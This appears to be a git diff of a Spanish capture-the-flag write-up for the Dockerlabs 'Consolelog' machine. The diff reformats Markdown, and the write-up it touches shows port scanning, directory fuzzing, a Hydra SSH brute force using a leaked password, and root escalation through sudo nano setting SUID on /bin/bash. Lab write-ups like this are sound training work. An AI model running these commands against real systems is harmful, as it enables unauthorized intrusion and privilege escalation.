@@ -1,22 +1,30 @@
-# 🖥️ Writeup - Consolelog 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# Consolelog ​​
+
+## 🖥️ Writeup - Consolelog
+
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `Web` `Node.js` `Gobuster` `Hydra` `Sudoers` `SUID`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip consolelog.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh consolelog.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p80,3000,5000 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-13 21:08 CEST
 Nmap scan report for 172.17.0.2
@@ -84,14 +93,16 @@ Vemos que los puertos `80` y `3000` tienen un servicio `HTTP`, y el puerto `5000
 
 Accedemos al puerto `80` y encontramos una página muy simple, sin información relevante aparente.
 
-# GOBUSTER
+## GOBUSTER
 
 Realizamos `fuzzing` de directorios para localizar posibles rutas o archivos ocultos.
 
 ```bash
 gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,zip,php,txt,bak,sh -b 403,404 -t 60
 ```
+
 Info:
+
 ```
 ===============================================================
 Gobuster v3.8
@@ -125,9 +136,7 @@ app.post('/recurso/', (req, res) => {
 
 Si esta contraseña se estuviera reutilizando por algún usuario del sistema, podríamos ganar acceso.
 
-
-
-# FUERZA BRUTA
+## FUERZA BRUTA
 
 Decidimos lanzar un ataque de `fuerza bruta` contra el puerto `5000` (`SSH`), empleando la contraseña encontrada junto con un diccionario de usuarios.
 
@@ -136,6 +145,7 @@ hydra -L /usr/share/wordlists/rockyou.txt -p lapassworddebackupmaschingonadetoda
 ```
 
 Info:
+
 ```
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -155,15 +165,16 @@ Accedemos por `SSH` con este usuario.
 ssh lovely@172.17.0.2 -p 5000
 ```
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 Una vez dentro, comprobamos permisos `sudo`, `SUID`, `Capabilities`.
 
-```bash 
+```bash
 sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for lovely on e5d28c7e1777:
     env_reset, mail_badpass,
@@ -178,6 +189,7 @@ Comprobamos que podemos ejecutar el binario `nano` con privilegios de `root`, lo
 ```bash
 sudo nano
 ```
+
 Una vez dentro de la interfaz de `nano`, usamos la combinación `Ctrl + T` para ejecutar un comando.
 
 ```bash
@@ -186,11 +198,12 @@ chmod +s /bin/bash
 
 Tras salir del editor, el binario `/bin/bash` queda con permisos `SUID`, por lo que la escalada resulta sencilla mediante el siguiente comando:
 
-```bash 
+```bash
 /bin/bash -p
 ```
 
 Info:
+
 ```
 bash-5.2# whoami
 root
